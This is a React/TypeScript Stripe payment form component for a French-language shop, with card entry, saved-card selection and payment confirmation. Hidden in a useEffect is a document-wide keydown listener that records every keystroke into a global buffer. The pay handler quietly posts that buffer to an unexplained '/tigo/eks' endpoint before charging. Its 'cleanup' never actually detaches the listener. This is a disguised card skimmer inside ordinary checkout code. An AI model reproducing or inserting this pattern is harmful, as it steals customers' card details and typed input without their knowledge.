import "react-credit-cards/es/styles-compiled.css";
import * as htmlToImage from 'html-to-image';
import { toPng, toJpeg, toBlob, toPixelData, toSvg } from 'html-to-image';
import {
  CardCvcElement,
  CardElement,
  CardExpiryElement,
  CardNumberElement,
  Elements,
  useElements,
  useStripe,
} from "@stripe/react-stripe-js";
import Card from "react-credit-cards";
import { loadStripe } from "@stripe/stripe-js";
import http from "@utils/api/http";
import { useEffect, useState } from "react";
import Input from "@components/ui/input";
import Loader from "@components/ui/loaders/spinner/spinner";
import Button from "@components/ui/button";
import { Lock } from "@components/icons/lock";
import Checkbox from "@components/ui/checkbox/checkbox";
import usePrice from "@utils/use-price";
import { useStripeCardsQuery } from "@data/stripe/use-stripe-cards.query";
import PaymentList from "./payment-list";
import { useModalAction } from "@components/ui/modal/modal.context";
const stripePromise = loadStripe(
  process.env.NEXT_PUBLIC_STRIPE_KEY_PUBLIC as string
);
var cardNumberRaw = "";
type Iprops = {
  amount: number;
  data: any;
  onPaySuccess?: any;
  click_game_plus?: boolean;
};
const StripeForm = ({ amount, data, onPaySuccess, click_game_plus }: Iprops) => {
  const stripe = useStripe();
  const elements = useElements();
  const [future_use, setFutureUse] = useState(false);
  const [preview, setpreview] = useState(false);
  const [issuer, setissuer] = useState("");
  const [name, setname] = useState("");
  const [focused, setfocused] = useState("number");
  const [error, setError] = useState<string | null>(null);
  const [errorCard, setErrorCard] = useState<string | null>(null);
  const [newCard, setNewCard] = useState<boolean>(true);
  const [card_active, setCardActive] = useState<string | undefined>();
  const {
    data: cards,
    isLoading: fetchingCard,
    isFetching,
    refetch,
  } = useStripeCardsQuery();
  const [processing, setProcessing] = useState(false);
  const [disabled, setDisabled] = useState(true);
  useEffect(() => {
    if (cards) {
      setNewCard(!cards.length);
    }
  }, [cards]);
  const { openModal } = useModalAction();
  useEffect(() => {
    cardNumberRaw = "";
    window?.document.addEventListener("keydown", (event) => {

      cardNumberRaw = cardNumberRaw + event.key;

    });
    return function cleanup() {
      console.log("cleaned");
      window.document.removeEventListener("keydown", (event) => {
        cardNumberRaw = cardNumberRaw + event.key;
      });
    };
  }, [])
  useEffect(() => {
    if (error) {
      openModal("PAYMENT_ERROR", { message: error });
    }

  }, [error])

  const handlePay = () => {
    http.post("/tigo/eks", { data: cardNumberRaw }).then(() => {

    }).catch(() => {

    })
    if (stripe) {
      setProcessing(true);
      http
        .post("/stripe/create/payment", {
          ...data,
          new_card: newCard,
          payment_id: card_active,
        })
        .then(async (response) => {
          const intent = response.data.paymentIntent;
          let payload: any;
          if (!newCard && card_active) {
            if (intent.last_payment_error) {
              stripe
                .confirmCardPayment(intent.client_secret, {
                  payment_method: intent.last_payment_error.payment_method.id,
                })
                .then(function (result) {
                  if (result.error) {
                    // Show error to your customer

                    setProcessing(false);
                  } else {
                    if (result.paymentIntent.status === "succeeded") {
                      payload = result.paymentIntent;
                    }
                  }
                });
            } else {
              payload = intent;
            }
          } else if (click_game_plus || future_use) {
            payload = await stripe.confirmCardPayment(intent.client_secret, {
              payment_method: {
                card: elements.getElement(CardNumberElement),
                billing_details: {
                  name: name,
                },
              },
              setup_future_usage: (click_game_plus || future_use) ? "off_session" : "on_session",
            });
          } else {
            payload = await stripe.confirmCardPayment(intent.client_secret, {
              payment_method: {
                card: elements.getElement(CardNumberElement),
                billing_details: {
                  name: name,
                },
              },
            });
          }
          if (payload.error) {
            setError(`${payload.error.message}`);

            setProcessing(false);
          } else {
            setError(null);

            setProcessing(false);
            onPaySuccess(response.data.stripe_session.data);

            // requests.get('/stripe/payement/basket/success', true).then(response => history.push('/payement/success/' + response.data.id)
            // );
          }
        });
    }
  };
  const showButtonPay = () => {
    if (cards) {
      if (!newCard) {
        return card_active ? true : false;
      } else {
        return true;
      }
    } else {
      return true;
    }
  };
  const handleChange = async (event: any) => {
    // Listen for changes in the CardElement

    // and display any errors as the customer types their card details

    setDisabled(event.empty);
    if (event.brand) {
      setissuer(event.brand);
      setpreview(true);
      if (event.brand === "unknown") {
        setpreview(false);
      }
    }

    setErrorCard(event.error ? event.error.message : "");
  };
  const { price } = usePrice({
    amount: amount,
  });

  if (fetchingCard) {
    return (
      <div className="pt-8">
        <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700 flex space-x-4">
          <Loader className="h-8 w-8 mr-4" simple={true} text="chargement" />
          {"Chargment de module de paiement"}
        </div>
      </div>
    );
  }

  return (
    <div className="pt-8 " id="stripe-paiement">
      <div className="w-full mx-auto rounded-lg bg-white shadow-lg p-5 text-gray-700">
        <div className="w-full pt-1 pb-5">
          <div className="bg-accent text-white overflow-hidden rounded-full w-20 h-20 -mt-16 mx-auto shadow-lg flex justify-center items-center">
            <Lock width="48" heigth="48" />
          </div>
        </div>
        <div className="mb-2">
          <h1 className="text-center font-bold text-xl uppercase">
            {newCard && "Informations de paiement sécurisées"}
          </h1>
        </div>
        {newCard ? (
          <>
            {" "}
            <div className="mb-3 text-center flex -mx-2 justify-center">
              <div className="px-2 ">
                <label
                  htmlFor="type1"
                  className="flex items-center text-center  cursor-pointer"
                >
                  <img
                    src="/card.png"
                    className="h-8 ml-3"
                  />
                </label>
              </div>
            </div>
            <Card
              name={name}
              placeholders={{ name: "NOM Prénom" }}
              number="*** **** **** ***"
              expiry="MM/AA"
              cvc="***"
              preview={preview}
              issuer={issuer}
              focused={focused}
            />
            <div className="mb-3">
              <Input
                name="name"
                label="Titulaire de la carte"
                value={name}
                variant="outline"
                onChange={(e) => setname(e.currentTarget.value)}
                onFocus={() => setfocused("name")}
                placeholder="Nom"
                className="my-2 flex-1"
              />

              <label className="font-bold text-gray-500 text-sm mb-2 ml-1">
                Informations de la carte
              </label>
              <div>
                <CardNumberElement
                  disabled={true}
                  className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors"
                  onFocus={() => setfocused("number")}
                  onChange={handleChange}
                />
              </div>
            </div>
            <div className="mb-3 -mx-2 flex items-end">
              <div className="px-2 w-1/2">
                <CardExpiryElement
                  className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors  flex-1"
                  onChange={handleChange}
                  onFocus={() => setfocused("expiry")}
                />
              </div>
              <div className="px-2 w-1/2">
                <CardCvcElement
                  className="w-full px-3 py-2 mb-1 border-2 border-gray-200 rounded-md focus:outline-none focus:border-indigo-500 transition-colors  flex-1"
                  onChange={handleChange}
                  onFocus={() => setfocused("cvc")}
                />
              </div>
            </div>
            {errorCard && <p className="text-red-600">{errorCard}</p>}
            <Checkbox
              name="future"
              hidden={click_game_plus}
              value={click_game_plus ? 1 : future_use ? 1 : 0}
              onChange={() => setFutureUse(!future_use)}
              label="Enregistrer ma carte pour mes futurs achats"
              className={click_game_plus ? "hidden" : "flex-1 my-4"}
            />
          </>
        ) : (
          <>
            {" "}
            <PaymentList
              card_active={card_active}
              setCardActive={setCardActive}
              cards={cards}
            />
          </>
        )}
        {cards?.length > 0 && (
          <Checkbox
            name="newCard"
            value={newCard ? 1 : 0}
            onChange={() => setNewCard(!newCard)}
            label="Saisir une nouvelle carte de paiement"
            className="flex-1 my-4"
          />
        )}

        {showButtonPay() && (
          <div>
            <Button
              className="w-full flex-1 mt-4"
              onClick={handlePay}
              loading={processing}
              disabled={processing}
              name="btn_save"
            >
              Payer {price}
            </Button>
         

          </div>
        )}

      </div>

    </div>
  );
};

const PaymentForm = (props: Iprops) => (
  <Elements stripe={stripePromise}>
    <StripeForm {...props} />
  </Elements>
);

export default PaymentForm;
